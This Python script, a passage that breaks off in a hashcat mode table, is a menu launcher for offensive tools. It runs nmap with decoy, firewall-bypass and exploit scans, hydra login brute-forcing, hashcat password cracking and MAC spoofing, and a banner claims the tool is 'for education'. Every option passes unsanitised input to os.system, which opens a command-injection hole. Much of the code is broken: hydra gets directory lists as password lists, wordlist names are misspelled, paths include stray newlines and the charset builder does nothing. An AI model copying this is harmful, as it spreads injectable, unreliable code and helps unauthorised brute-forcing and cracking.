#!/usr/bin/env python
# -*- coding utf-8 -*-
import socket
import fcntl
import struct
import os
import uuid
import time 
import subprocess
import signal
from colorama import Fore





def figlet2():
	os.system ("clear")
	os.system ("figlet MIRLEX-TOOLKIT | lolcat -t")
def figlet3():
	os.system ("figlet MIRLEX-TOOLKIT | lolcat -t -a -s 300")

def getip(ifname):
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  
        struct.pack('256s', bytes(ifname[:15], 'utf-8'))  
    )[20:24])

localip=getip('eth0')


def getmac(): 

	mac_num = hex(uuid.getnode()).replace('0x', '').zfill(12)
	mac = ':'.join(mac_num[i: i + 2] for i in range(0, 11, 2))
	return mac

maci=getmac()
	

def default22():
	os.system("clear")
	print(f"""
{Fore.YELLOW}
	---------------------------------------------
	|ITS MADE FOR EDUCATION,PLEASE DONT ABUSE IT|
	---------------------------------------------
	""")
def default():
	print(f"""
{Fore.YELLOW}
	---------------------------------------------------------
	|   TOOLS ->   IT IS RECOMMENDED TO RUN THE TOOL AS ROOT|		
	---------------------------------------------------------
	| Your Local Ip Adress: {localip}		        		|
	| Your Mac Adress: {maci}                       		|
	---------------------------------------------------------
	0-		Ping
	1-		Nmap
	2-		Gobuster	
	3-		Netdiscover
	4-		Hydra			
	5-		Binwalk
	6-		Macchanger
	7-		Zip Breaker
	8-		Hashcat
	9-		Firewall Tester
	10-		VPN Tester
	11-		Launch VPNs with .ovpn extension
	12- 		Crunch
	13-		Exiftool
	14-		Weevely
	15-		SearchSploit
	16-		Msfvenom
	17-		Msfconsole (just for the listener)
	
					
	99-		EXIT
{Fore.RESET}
	""")

default22()
figlet3()
default()

def ping():
	os.system("figlet PING | lolcat -t")

def ping_pro():
	print(f"""
{Fore.YELLOW}	----------------------------------------
			PING
	----------------------------------------
	Your Local Ip Adress: {localip}
	
	0-		Default			127.0.0.1
	1-		convert WWW to IP	www.example.com
	
	99-		Main Menu
	000-		EXIT MIRLEX-TOOLKIT
{Fore.RESET}
	""")
	while True:

		pingno=input("PLease select the options: ")
		if (pingno=="0"):
			pingip=input("Please enter ip: ")
			os.system("ping "+pingip)
		elif (pingno=="1"):
			websitead=input("Please enter the web site URL: ")
			proc = subprocess.Popen(["ping", websitead], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			time.sleep(2)
			proc.send_signal(signal.SIGINT)
			stdout, stderr = proc.communicate()
			for i in stdout.decode().split("\n"):
				if "PING" in i:
					for sayac in i.split():
						if "(" in sayac:
							ip_adresi = sayac
							print(f"IP address of the website: {ip_adresi}")
							break
					break	
		elif (pingno=="99"):
			figlet2()
			default()
			Main()
		elif(pingno=="000"):
			print("""
			-----------------------------
				See You Later
			-----------------------------
			""")
			exit()
		else:
			print("Invalid option. Please try again.")




def nmap_pro():
	print(f"""
{Fore.YELLOW}
	-----------------------------------------
	                NMAP
	-----------------------------------------
	Your Local Ip Adress: {localip}
	
	0-		Regular Scan				nmap
	1-		Ping Scan				nmap -sn
	2-		Quick Scan				nmap -T4 -F
	3-		Quick Scan Plus (OS scan)		nmap -sV -T4 -O -F --version-light
	4-		Quick Traceroute			nmap -sn --traceroute
	5-		Intense Scan				nmap -T4 -A -v
	6-		Intense Scan UDP 			nmap -sS -sU -T4 -A -v
	7-		Intense Scan All TCP Ports 		nmap -p 1-65535 -T4 -A -v
	8-		Intense Scan , No Ping			nmap -T4 -A -v -Pn
	9-		Finding devices with in the network	nmap -sn -n -v --open 192.168.1.0/24
	10-		Finding devices with in the network 	Manually entered ip range
	11-		Mirlex Scan				nmap -Pn -sS -sV -n -v --reason --open
	12-		Mirlex Scan 2 (firewall bypass)		nmap -sS -sV -sC -n --open -f
	13-		Mirlex Scan 3 (random port scan)	nmap -sS -sV -sC -n --open -r
	14-		recommended for local browsing		nmap -O --fuzzy -sV
	15-		Manually				parameters to be entered manually
	
 İNFO = To send requests from different IPs(10)			-D RND:10
 İNFO = Performs brute force on open ports			--script brute
 İNFO = Performs exploit scans					--script exploit
 İNFO =	Performs vulnerability scanning				--script vuln
	
	99-		Main MEnu
	000-		EXIT MIRLEX-TOOLKIT
{Fore.RESET}
	""")
	
	while True:
		nmapno=input("Please select the options: ")
		if (nmapno=="0"):
			ipno=input("Please enter ip: ")
			os.system("nmap "+ipno)
		elif (nmapno=="1"):
			ipno=input("Please enter ip: ")
			os.system("nmap -sn "+ipno)
		elif (nmapno=="2"):
			ipno=input("Please enter ip: ")
			os.system("nmap -T4 -F "+ipno)
		elif (nmapno=="3"):
			ipno=input("Please enter ip: ")
			os.system("nmap -sV -T4 -O -F --version-light "+ipno)
		elif (nmapno=="4"):
			ipno=input("Please enter ip: ")
			os.system("nmap -sn --traceroute "+ipno)
		elif (nmapno=="5"):
			ipno=input("Please enter ip: ")
			os.system("nmap -T4 -A -v "+ipno)
		elif (nmapno=="6"):
			ipno=input("Please enter ip: ")
			os.system("nmap -sS -sU -T4 -A -v "+ipno)
		elif (nmapno=="7"):
			ipno=input("Please enter ip: ")
			os.system("nmap -p 1-65535 -T4 -A -v "+ipno)
		elif (nmapno=="8"):
			ipno=input("Please enter ip: ")
			os.system("nmap -T4 -A -v -Pn "+ipno)
		elif (nmapno=="9"):
			os.system("nmap -sn -n -v --open 192.168.1.0/24")
		elif (nmapno=="10"):
			iparalık=input("Please enter your IP address range for example->0/24: ")
			os.system("nmap -sn -n -v --open "+iparalık)
		elif (nmapno=="11"):
			ipno=input("Please enter ip: ")
			os.system("nmap -Pn -sS -sV -n -v --reason --open "+ipno)
		elif (nmapno=="12"):
			ipno=input("Please enter ip: ")
			os.system("nmap -sS -sV -sC -n --open -f "+ipno)
		elif (nmapno=="13"):
			ipno=input("Please enter ip: ")
			os.system("nmap -sS -sV -sC -n --open -r "+ipno)
		elif (nmapno=="14"):
			ipno=input("Please enter ip: ")
			os.system("nmap -O --fuzzy -sV "+ipno)
		elif (nmapno=="15"):
			ipno=input("Please enter ip: ")
			parametre=input("Please enter parameters: ")
			os.system("nmap "+parametre+" "+ipno)
		elif (nmapno=="99"):
			figlet2()
			default()
			Main()
		elif(nmapno=="000"):
			print("""
			-----------------------------
				See You Later
			-----------------------------
			""")
			exit()
		else:
			print("Invalid option. Please try again.")
		




def gobuster_pro():
	print(f"""
{Fore.YELLOW}
	------------------------------------------
			GOBUSTER
	------------------------------------------
	Your Local Ip Adress: {localip}
	
	0-		General		rockyou.txt
	1-		Directory	directory-list-2.3-medium.txt
	2-		Directory	directory-list-2.3-small.txt
	3-		Directory	directory-list-lowercase-2.3-medium.txt
	4-		Directory	directory-list-lowercase-2.3-small.txt
	5-		Directory	directory-list-1.0.txt
	6-		Directory	apache-user-enum-2.0.txt
	7-		Directory	apache-user-enum-1.0.txt
	8-		Your Wordlist	Wordlist path will be entered manually
	
	99-		Main Menu
	000-		EXIT MIRLEX-TOOLKIT
{Fore.RESET}
	""")
	while True:
		gobusterno=input("Please select the options: ")
		dosya=''
		if (gobusterno=="0"):
			gobusteripno=input("Please enter ip adress or web site: ")
			dosya="rockyou.txt"
			os.chdir("src/wordlists/dirbuster")
			os.system("gobuster dir -u "+ gobusteripno + " -w "+dosya)
			os.chdir("../../..")
		elif (gobusterno=="1"):
			gobusteripno=input("Please enter ip adress or web site: ")
			dosya="directory-list-2.3-medium.txt"
			os.chdir("src/wordlists/dirbuster")
			os.system("gobuster dir -u "+ gobusteripno + " -w "+dosya)
			os.chdir("../../..")
		elif (gobusterno=="2"):
			gobusteripno=input("Please enter ip adress or web site: ")
			dosya="directory-list-2.3-small.txt"
			os.chdir("src/wordlists/dirbuster")
			os.system("gobuster dir -u "+ gobusteripno + " -w "+dosya)
			os.chdir("../../..")
		elif (gobusterno=="3"):
			gobusteripno=input("Please enter ip adress or web site: ")
			dosya="directory-list-lowercase-2.3-medium.txt"
			os.chdir("src/wordlists/dirbuster")
			os.system("gobuster dir -u "+ gobusteripno + " -w "+dosya)
			os.chdir("../../..")
		elif (gobusterno=="4"):
			gobusteripno=input("Please enter ip adress or web site: ")
			dosya="directory-list-lowercase-2.3-small.txt"
			os.chdir("src/wordlists/dirbuster")
			os.system("gobuster dir -u "+ gobusteripno + " -w "+dosya)
			os.chdir("../../..")
		elif (gobusterno=="5"):
			gobusteripno=input("Please enter ip adress or web site: ")
			dosya="directory-list-1.0.txt"
			os.chdir("src/wordlists/dirbuster")
			os.system("gobuster dir -u "+ gobusteripno + " -w "+dosya)
			os.chdir("../../..")
		elif (gobusterno=="6"):
			gobusteripno=input("Please enter ip adress or web site: ")
			dosya="apache-user-enum-2.0.txt"
			os.chdir("src/wordlists/dirbuster")
			os.system("gobuster dir -u "+ gobusteripno + " -w "+dosya)
		elif (gobusterno=="7"):
			gobusteripno=input("Please enter ip adress or web site: ")
			dosya="apache-user-enum-1.0.txt"
			os.chdir("src/wordlists/dirbuster")
			os.system("gobuster dir -u "+ gobusteripno + " -w "+dosya)
			os.chdir("../../..")
		elif (gobusterno=="8"):
			gobusteripno=input("Please enter ip adress or web site: ")
			gobusteryol=input("Please enter the path to your wordlist: ")
			os.system("gobuster dir -u "+gobusteripno+" -w "+gobusteryol)
		elif (gobusterno=="99"):
			figlet2()
			default()
			Main()
		elif(gobusterno=="000"):
			print("""
			-----------------------------
				See You Later
			-----------------------------
			""")
			exit()
		else:
			print("Invalid option. Please try again.")
			
		

	
	
	
def netdiscover():
	print(f"""
{Fore.YELLOW}
	------------------------------------------
			Netdiscover
	------------------------------------------
	Your Local Ip Adress: {localip}
	
	0-	Finding Devices on Local Network with external card		netdiscover -i xxxx -r 192.168.2.1/24
	1-	Finding Devices on Local Network with internal card		netdiscover -r 192.168.2.1/24
	2-	Manually external						netdiscover -i xxxx -r xxxxxxxxxxxxxx
	3-	Manually internal						netdiscover -r xxxxxxxxxxxxxx						
	
	99-	Main Menu
	000-	EXIT MIRLEX-TOOLKIT
{Fore.RESET}
	""")
	while True:
		netdiscoverno=input("Please select the options: ")
		if (netdiscoverno=="0"):
			card=str(input("Please enter the name of your wifi interface card: "))
			os.system("netdiscover -i "+card+" -r 192.168.2.1/24")
		elif (netdiscoverno=="1"):
			os.system("netdiscover -r 192.168.2.1/24")
		elif (netdiscoverno=="2"):
			card=str(input("Please enter the name of your wifi interface card: "))
			netip=input("Please enter the ip range|for example -> 10.0.2.0/24|: ")
			os.system("netdiscover -i "+card+" -r "+netip)
		elif (netdiscoverno=="3"):
			netip=input("Please enter the ip range|for example -> 10.0.2.0/24|: ")
			os.system("netdiscover -r "+netip)
		elif (netdiscoverno=="99"):
			figlet2()
			default()
			Main()
		elif(netdiscoverno=="000"):
			print("""
			-----------------------------
				See You Later
			-----------------------------
			""")
			exit()
		else:
			print("Invalid option. Please try again.")
	
	
	
			
		
def hydra_pro():
	print(f"""
{Fore.YELLOW}
	------------------------------------------
			HYDRA
	------------------------------------------
	Your Local Ip Adress: {localip}
	
	0-		General		rockyou.txt
	1-		Directory	directory-list-2.3-medium.txt
	2-		Directory	directory-list-2.3-small.txt
	3-		Directory	directory-list-lowercase-2.3-medium.txt
	4-		Directory	directory-list-lowercase-2.3-small.txt
	5-		Directory	directory-list-1.0.txt
	6-		Directory	apache-user-enum-2.0.txt
	7-		Directory	apache-user-enum-1.0.txt
	8-		Directory	fasttrack.txt
	9-		Your Wordlist	Wordlist path will be entered manually
	10-		View Commonly Default Modem Usernames
	
	99-		Main Menu
	000-		EXIT MIRLEX-TOOLKIT
{Fore.RESET}
	""")
	while True:
		hydrano=input("Please select the options: ")
		dosya=''
		if (hydrano=="0"):
			dosya="rocyou.txt"
			hydraipno=input("Please enter ip adress or web site: ")
			hydrausername=str(input("Please enter login username: "))
			cikti=os.popen("pwd").read()
			os.system("hydra -l "+ hydrausername +" -P "+cikti+"/src/wordlists/"+ dosya+" "+hydraipno)
		elif (hydrano=="1"):
			dosya="directory-list-2.3-medium.txt"
			hydraipno=input("Please enter ip adress or web site: ")
			hydrausername=str(input("Please enter login username: "))
			cikti=os.popen("pwd").read()
			os.system("hydra -l "+ hydrausername +" -P "+cikti+"/src/wordlists/"+ dosya+" "+hydraipno)
		elif (hydrano=="2"):
			dosya="directory-list-2.3-small.txt"
			hydraipno=input("Please enter ip adress or web site: ")
			hydrausername=str(input("Please enter login username: "))
			cikti=os.popen("pwd").read()
			os.system("hydra -l "+ hydrausername +" -P "+cikti+"/src/wordlists/"+ dosya+" "+hydraipno)
		elif (hydrano=="3"):
			dosya="directory-list-lowercase-2.3-medium.txt"
			hydraipno=input("Please enter ip adress or web site: ")
			hydrausername=str(input("Please enter login username: "))
			cikti=os.popen("pwd").read()
			os.system("hydra -l "+ hydrausername +" -P "+cikti+"/src/wordlists/"+ dosya+" "+hydraipno)
		elif (hydrano=="4"):
			dosya="directory-list-lowercase-2.3-small.txt"
			hydraipno=input("Please enter ip adress or web site: ")
			hydrausername=str(input("Please enter login username: "))
			cikti=os.popen("pwd").read()
			os.system("hydra -l "+ hydrausername +" -P "+cikti+"/src/wordlists/"+ dosya+" "+hydraipno)
		elif (hydrano=="5"):
			dosya="directory-list-1.0.txt"
			hydraipno=input("Please enter ip adress or web site: ")
			hydrausername=str(input("Please enter login username: "))
			cikti=os.popen("pwd").read()
			os.system("hydra -l "+ hydrausername +" -P "+cikti+"/src/wordlists/"+ dosya+" "+hydraipno)
		elif (hydrano=="6"):
			dosya="apache-user-enum-2.0.txt"
			hydraipno=input("Please enter ip adress or web site: ")
			hydrausername=str(input("Please enter login username: "))
			cikti=os.popen("pwd").read()
			os.system("hydra -l "+ hydrausername +" -P "+cikti+"/src/wordlists/"+ dosya+" "+hydraipno)
		elif (hydrano=="7"):
			dosya="apache-user-enum-1.0.txt"
			hydraipno=input("Please enter ip adress or web site: ")
			hydrausername=str(input("Please enter login username: "))
			cikti=os.popen("pwd").read()
			os.system("hydra -l "+ hydrausername +" -P "+cikti+"/src/wordlists/"+ dosya+" "+hydraipno)
		elif (hydrano=="8"):
			dosya="fasttrack.txt"
			hydraipno=input("Please enter ip adress or web site: ")
			hydrausername=str(input("Please enter login username: "))
			cikti=os.popen("pwd").read()
			os.system("hydra -l "+ hydrausername +" -P "+cikti+"/src/wordlists/"+ dosya+" "+hydraipno)
		elif (hydrano=="9"):
			hydraipno=input("Please enter ip adress or web site: ")
			hydrausername=str(input("Please enter login username: "))
			hydramanual=input("Please enter the path to your own wordlist: ")
			os.system("hydra -l "+hydrausername+" -P "+hydramanual+" "+hydraipno)
		elif (hydrano=="10"):
			os.chdir("/src/wordlists/defaultmodempasswd")
			os.system("cat defaultmodempasswd")
			os.chdir("../../..")
		elif (hydrano=="99"):
			figlet2()
			default()
			Main()
		elif(hydrano=="000"):
			print("""
			-----------------------------
				See You Later
			-----------------------------
			""")
			exit()
		else:
			print("Invalid option. Please try again.")
			



def binwalk():
	print(f"""
{Fore.YELLOW}
	------------------------------------------
		BINWALK FILE INFORMATION
	------------------------------------------
	
	0-	Default
	
	99- 	Main Menu
	000-	EXIT MIRLEX-TOOLKIT
{Fore.RESET}
	""")
	
	while True:
		binwalkno=input("Please select the options: ")
		binwalkdosya=''
		dosyanınadı=''
		if (binwalkno=="0"):
			binwalkdosya=input("please enter the file path with file name: ")
			os.system("binwalk -e "+binwalkdosya)
		elif (binwalkno=="99"):
			figlet2()
			default()
			Main()
		elif(binwalkno=="000"):
			print("""
			-----------------------------
				See You Later
			-----------------------------
			""")
			exit()
		else:
			print("Invalid option. Please try again.")
		


def macchanger():
	print(f"""
{Fore.YELLOW}
	------------------------------------------
			Macchanger
	------------------------------------------
	Your Mac Adress: {maci}
	
	0-	Mac changer with internal card (Random)
	1-	Mac changer with internal card (Manually entered address)
	2-	Mac changer with external card (Random)
	3-	Mac changer with external card (Manually entered address)
	4-	Change mac address to original (External)
	5-	Change mac adresss to original (Internal)  
	
	99- 	Main Menu
	000-	EXIT MIRLEX-TOOLKIT
{Fore.RESET}
	""")
	while True:
		macno=input("Please select the options: ")
		if (macno=="0"):
			os.system("ifconfig eth0 down")
			os.system("sudo macchanger -r eth0")
			os.system("ifconfig eth0 up")
			print("!!! Your mac address has been successfully changed to random !!!")
		elif (macno=="1"):
			usermac=input("Please write the address you want to give to your mac address|for example -> 00:00:00:00:00:00 | : ")
			os.system("ifconfig eth0 down")
			os.system("sudo macchanger --mac "+usermac+" eth0")
			os.system("ifconfig eth0 up")
			print("!!! Your mac address has been successfully changed to "+usermac+" !!!")
		elif (macno=="2"):
			maccard=str(input("Please enter the name of your wifi interface card: "))
			os.system("ifconfig "+maccard+" down")
			os.system("sudo macchanger -r "+maccard)
			os.system("ifconfig "+maccard+" up")
			print("!!! The MAC address of your external card with "+maccard+" interface has been successfully changed to random. !!!")
		elif (macno=="3"):
			maccard2=str(input("Please enter the name of your wifi interface card: "))
			usermac2=input("Please write the address you want to give to your mac address|for example -> 00:00:00:00:00:00 | : ")
			os.system("ifconfig "+maccard2+" down")
			os.system("sudo macchanger --mac "+usermac2+" "+maccard2)
			os.system("ifconfig "+maccard2+" up")
			print("!!! The MAC address of your external card with "+maccard2+" interface has been successfully changed to "+usermac2+". !!!")
		elif (macno=="4"):
			maccard3=str(input("Please enter the name of your wifi interface card: "))
			os.system("ifconfig "+maccard3+" down")
			os.system("sudo macchanger -p "+maccard3)
			os.system("ifconfig "+maccard3+" up")
			print("!!! The MAC address of your card named "+maccard3+" has been changed to the original MAC address. !!!")
		elif (macno=="5"):
			os.system("ifconfig eth0 down")
			os.system("sudo macchanger -p eth0")
			os.system("ifconfig eth0 up")
			print("!!! Your mac address has been changed with your original mac address. !!!")
		elif (macno=="99"):
			figlet2()
			default()
			Main()
		elif(macno=="000"):
			print("""
			-----------------------------
				See You Later
			-----------------------------
			""")
			exit()
		else:
			print("Invalid option. Please try again.")



def firewalltester():
	print(f"""
{Fore.YELLOW}
	------------------------------------------
		     Firewall Tester
	------------------------------------------
	0-	Default Test
	
	99-	Main Menu
	000-	EXIT MIRLEX-TOOLKIT
{Fore.RESET}
	
	""")
			
	while True:	
		fireno=input("Please select the options: ")
		if (fireno=="0"):
			fireip=input("Please enter IP address or Web site URL: ")
			os.system("wafw00f "+fireip)
		elif (fireno=="99"):
			figlet2()
			default()
			Main()
		elif(fireno=="000"):
			print("""
			-----------------------------
				See You Later
			-----------------------------
				""")
			exit()
		else:
			print("Invalid option. Please try again.")



def vpntester():
	print(f"""
{Fore.YELLOW}
	------------------------------------------
		     VPN Tester
	------------------------------------------
	0-	Default Test
	
	99-	Main Menu
	000-	EXIT MIRLEX-TOOLKIT
{Fore.RESET}	
	
	""")
	while True:
		vpnno=input("Please select the options: ")
		if (vpnno=="0"):
			vpnip=input("Please enter IP address or Web site URL: ")
			os.system("ike-scan "+vpnip)
			print("""
	---------------------------------------------------------------------------------------------------------------
	0 returned handshake; 0 returned notify  <- If it gives information like the one on the side, this is NOT a VPN
	1 returned handshake; 0 returned notify  <- If it gives information like the one on the side, this is a VPN
	---------------------------------------------------------------------------------------------------------------
				""")
		
		elif (vpnno=="99"):
			figlet2()
			default()
			Main()
		elif(vpnno=="000"):
			print("""
			-----------------------------
				See You Later
			-----------------------------
				""")
			exit()
		else:
			print("Invalid option. Please try again.")
	




def openvpn():
	print(f"""
{Fore.YELLOW}
	------------------------------------------
		     VPN Launcher
	------------------------------------------
	Your Local Ip Adress: {localip}
	
	0-	run VPN file 	  |Not in the same folder as Mirlex Toolkit
	1-	Fast for .ovpn	  |The file must be in the same folder as Mirlex-Toolkit
	2-	Fast for VPNbook  |The file must be in the same folder as Mirlex-Toolkit
	3- 	VPN file but .zip extensions (This option extracts it from the .zip partitions and then runs it.It is recommended to use it on the first download)
	
	99-	Main Menu
	000-	EXIT MIRLEX-TOOLKIT
{Fore.RESET}
	
	""")
	while True:
		openvpnno=input("Please select the options: ")
		if (openvpnno=="0"):
			pathvpn=input("Please enter the full path to the file (do not enter the name of the file) and not enter ->/<-: ")
			vpnisim=input("Please enter the name of your file along with its extension: ")
			os.chdir("/"+pathvpn)
			os.system("openvpn "+vpnisim)	
		elif (openvpnno=="1"):
			vpnisim=input("Please enter the name of your file along with its extension: ")
			os.system("openvpn "+vpnisim)
		elif (openvpnno=="2"):
			vpnisim=input("Please enter the name of your file along with its extension: ")
			os.system("openvpn "+vpnisim)
		elif (openvpnno=="3"):
			pathvpn=input("Please enter the full path to the file (do not enter the name of the file) and not enter ->/<-: ")
			vpnisim=input("Please enter the name of your file along with its extension: ")
			base=os.path.splitext(vpnisim)[0]
			os.chdir("/"+pathvpn)
			os.system("unzip "+vpnisim)
			os.system("openvpn "+base)
		elif (openvpnno=="99"):
			figlet2()
			default()
			Main()
		elif (openvpnno=="000"):
			print("""
			-----------------------------
				See You Later
			-----------------------------
				""")
			exit()
		else:
			print("Invalid option. Please try again.")

def hashcat():
	print(f"""
{Fore.YELLOW}
	------------------------------------------
			Hashcat
	------------------------------------------
	Windows			enter->1000| -m 1000
	Linux			enter->1800| -m 1800
	WinZip			enter->13600| -m 13600
	7Zip			enter->11600| -m 11600
	BitLocker		enter->22100| -m 22100
	SSHA-256(Base64)	enter->1411| -m 1411
	SSHA-512(Base64)	enter->1711| -m 1711
	SHA256crypt($5$)	enter->7400| -m 7400
	SHA512crypt($6$)	enter->1800| -m 1800
	MD5crypt($1$)		enter->500| -m 500
	NTLM			enter->1000| -m 1000
	MD5			enter->0| -m 0
	Manually		enter->whatever you want| -m xxxx
	
	97-Search parametre	enter->97 |Used to filter parameters
	98-Help			enter->98 |See for all -m parametres
	99-Main Menu		enter->99
	000-EXIT MIRLEX-TOOLKIT	enter->000
	
{Fore.RESET}
	""")
	while True:
		hashno=input("Please enter parameter -m|Example->if you select 0 you should enter 1000: ")
		if hashno in ["1000", "1800","13600","11600","22100","1411","1711","7400","1800","500","1000","0"]:
			dosyaol=input("Please enter your hash code: ")
			dosyaismi=input("Please name the hash code to be saved: ")
			cık=os.popen("pwd").read()
			os.chdir(cık+"/src/hashcatlog/Created")
			os.system("echo "+dosyaol+" > "+dosyaismi+".txt")
			print(f"""
{Fore.YELLOW}
	------------------------------------------
			Attack Mode
	------------------------------------------
	000-	Continue without selecting attack mode
	0-	Straight			-a 0
  	1-	Combination			-a 1
  	3-	Brute-force			-a 3
  	6-	Hybrid Wordlist + Mask		-a 6
  	7-	Hybrid Mask + Wordlist		-a 7
  	9-	Association			-a 9	
  	99-	Main Menu
  	000-	EXIT MIRLEX-TOOLKIT
{Fore.RESET}		
				""")
			while True:
				attack=input("Please select the tool you want to use: ")
				if (attack=="000"):
					print(f"""
{Fore.YELLOW}
	------------------------------------------
			Wordlists
	------------------------------------------
	0-		General		rockyou.txt
	1-		Directory	fasttrack.txt
	2-		Directory	corpus.txt
	3-		Directory	wordlist.txt
	4-		Directory	count.txt
	5-		Your Wordlist	Wordlist path will be entered manually
	99-		Main Menu
	000-		EXIT MIRLEX-TOOLKIT
{Fore.RESET}				
						""")
					while True:
						listno=input("Please select the tool you want to use: ")
						if (listno=="0"):
							pwd=os.popen("pwd").read()
							os.system("hashcat -m "+hashno+" "+dosyaismi+".txt /usr/share/wordlists/rockyou.txt --potfile-disable -o "+pwd+"/src/hashcatlog/Results")
						elif (listno=="1"):
							pwd=os.popen("pwd").read()
							os.system("hashcat -m "+hashno+" "+dosyaismi+".txt /usr/share/wordlists//fasttrack.txt --potfile-disable -o "+pwd+"/src/hashcatlog/Results")
						elif (listno=="2"):
							pwd=os.popen("pwd").read()
							os.system("hashcat -m "+hashno+" "+dosyaismi+".txt "+pwd+"/src/Wordlists/corpus.txt --potfile-disable -o "+pwd+"/src/hashcatlog/Results")
						elif (listno=="3"):
							pwd=os.popen("pwd").read()
							os.system("hashcat -m "+hashno+" "+dosyaismi+".txt "+pwd+"/src/Wordlists/wordlist.txt --potfile-disable -o "+pwd+"/src/hashcatlog/Results")
						elif (listno=="4"):
							pwd=os.popen("pwd").read()
							os.system("hashcat -m "+hashno+" "+dosyaismi+".txt "+pwd+"/src/Wordlists/count.txt --potfile-disable -o "+pwd+"/src/hashcatlog/Results")
						elif (listno=="5"):
							pathno=input("Please enter the path of the word list along with its name and extension: ")
							pwd=os.popen("pwd").read()
							os.system("hashcat -m "+hashno+" "+dosyaismi+".txt "+pathno+" --potfile-disable -o "+pwd+"/src/hashcatlog/Results")
						elif (listno=="99"):
							figlet2()
							default()
							Main()
						elif (listno=="000"):
							print("""
			-----------------------------
				See You Later
			-----------------------------
				""")
							exit()
						else:
							print("Invalid option. Please try again.")
								
						
					
				elif (attack=="3"):
					print(f"""
{Fore.YELLOW}
	------------------------------------------
			Charset		
	------------------------------------------
	l | abcdefghijklmnopqrstuvwxyz [a-z]     enter->l
  	u | ABCDEFGHIJKLMNOPQRSTUVWXYZ [A-Z]	 enter->u
  	d | 0123456789                 [0-9]  	 enter->d
  	h | 0123456789abcdef           [0-9a-f]  enter->h
  	H | 0123456789ABCDEF           [0-9A-F]  enter->H
  	s |  !"#$%&'()*+,-./:;<=>?@[\]^_`|~  	 enter->s
  	a | ?l?u?d?s				 enter->a
	b | 0x00 - 0xff				 enter->b

	99-		Main Menu
	000-		EXIT MIRLEX-TOOLKIT

{Fore.RESET}					""")
					while True:
						cevap=str(input("Do you want to add character set?|Y/N ")).upper()
						if (cevap=="N"):
							break
						c=input("Type the character you want to add without a question mark at the beginning: ")
						b=int(input("How many digits should the "+c+" you choose have?: "))
						d="?c"
						e=d*b							
						
					
					
				
				elif (attack=="99"):
					figlet2()
					default()
					Main()				
				elif (attack=="000"):
					print("""
			-----------------------------
				See You Later
			-----------------------------
				""")
					exit()
								
				
	
				else:	
					modu=input("Please enter the attack mode no: ")
					print(f"""
{Fore.YELLOW}
	------------------------------------------
			Wordlists
	------------------------------------------
	0-		General		rockyou.txt
	1-		Directory	fasttrack.txt
	2-		Directory	corpus.txt
	3-		Directory	wordlist.txt
	4-		Directory	count.txt
	5-		Your Wordlist	Wordlist path will be entered manually
	99-		Main Menu
	000-		EXIT MIRLEX-TOOLKIT
{Fore.RESET}					
						""")
					while True:
						listno=input("Please select the tool you want to use: ")
						if (listno=="0"):
							pwd=os.popen("pwd").read()
							os.system("hashcat -m "+hashno+" -a "+modu+" "+dosyaismi+".txt /usr/share/wordlists/rockyou.txt --potfile-disable")
						elif (listno=="1"):
							pwd=os.popen("pwd").read()
							os.system("hashcat -m "+hashno+" -a "+modu+" "+dosyaismi+".txt /usr/share/wordlists/fasttrack.txt --potfile-disable -")
						elif (listno=="2"):
							pwd=os.popen("pwd").read()
							os.system("hashcat -m "+hashno+" -a "+modu+" "+dosyaismi+".txt "+pwd+"/src/Wordlists/corpus.txt --potfile-disable -o "+pwd+"/src/hashcatlog/Results")
						elif (listno=="3"):
							pwd=os.popen("pwd").read()
							os.system("hashcat -m "+hashno+" -a "+modu+" "+dosyaismi+".txt "+pwd+"/src/Wordlists/wordlist.txt --potfile-disable -o "+pwd+"/src/hashcatlog/Results")
						elif (listno=="4"):
							pwd=os.popen("pwd").read()
							os.system("hashcat -m "+hashno+" -a "+modu+" "+dosyaismi+".txt "+pwd+"/src/Wordlists/count.txt --potfile-disable -o "+pwd+"/src/hashcatlog/Results")
						elif (listno=="5"):
							pathno=input("Please enter the path of the word list along with its name and extension: ")
							pwd=os.popen("pwd").read()
							os.system("hashcat -m "+hashno+" -a "+modu+" "+dosyaismi+".txt "+pathno+" --potfile-disable -o "+pwd+"/src/hashcatlog/Results")
						elif (listno=="99"):
							figlet2()
							default()
							Main()
						elif (listno=="000"):
							print("""
			-----------------------------
				See You Later
			-----------------------------
				""")
							exit()
						else:
							print("Invalid option. Please try again.")
								
				
		elif (hashno=="97"):
			ara=input("enter the parameter you are looking for: ")
			os.system("hashcat --help | grep "+ara)
		elif (hashno=="98"):
			figlet2()
			print("""
{Fore.YELLOW}
	------------------------------------------
		    LOOK ALL PARAMETRE
	------------------------------------------
	- [ Hash modes ] -

      # | Name                                                       | Category
  ======+============================================================+======================================
    900 | MD4                                                        | Raw Hash
      0 | MD5                                                        | Raw Hash
    100 | SHA1                                                       | Raw Hash
   1300 | SHA2-224                                                   | Raw Hash
   1400 | SHA2-256                                                   | Raw Hash
  10800 | SHA2-384                                                   | Raw Hash
   1700 | SHA2-512                                                   | Raw Hash
  17300 | SHA3-224                                                   | Raw Hash
  17400 | SHA3-256                                                   | Raw Hash
  17500 | SHA3-384                                                   | Raw Hash
  17600 | SHA3-512                                                   | Raw Hash
   6000 | RIPEMD-160                                                 | Raw Hash
    600 | BLAKE2b-512                                                | Raw Hash
  11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian           | Raw Hash
  11800 | GOST R 34.11-2012 (Streebog) 512-bit, big-endian           | Raw Hash
   6900 | GOST R 34.11-94                                            | Raw Hash
  17010 | GPG (AES-128/AES-256 (SHA-1($pass)))                       | Raw Hash
   5100 | Half MD5                                                   | Raw Hash
  17700 | Keccak-224                                                 | Raw Hash
  17800 | Keccak-256                                                 | Raw Hash
  17900 | Keccak-384                                                 | Raw Hash
  18000 | Keccak-512                                                 | Raw Hash
   6100 | Whirlpool                                                  | Raw Hash
  10100 | SipHash                                                    | Raw Hash
     70 | md5(utf16le($pass))                                        | Raw Hash
    170 | sha1(utf16le($pass))                                       | Raw Hash
   1470 | sha256(utf16le($pass))                                     | Raw Hash
  10870 | sha384(utf16le($pass))                                     | Raw Hash
   1770 | sha512(utf16le($pass))                                     | Raw Hash
    610 | BLAKE2b-512($pass.$salt)                                   | Raw Hash salted and/or iterated
    620 | BLAKE2b-512($salt.$pass)                                   | Raw Hash salted and/or iterated
     10 | md5($pass.$salt)                                           | Raw Hash salted and/or iterated
     20 | md5($salt.$pass)                                           | Raw Hash salted and/or iterated
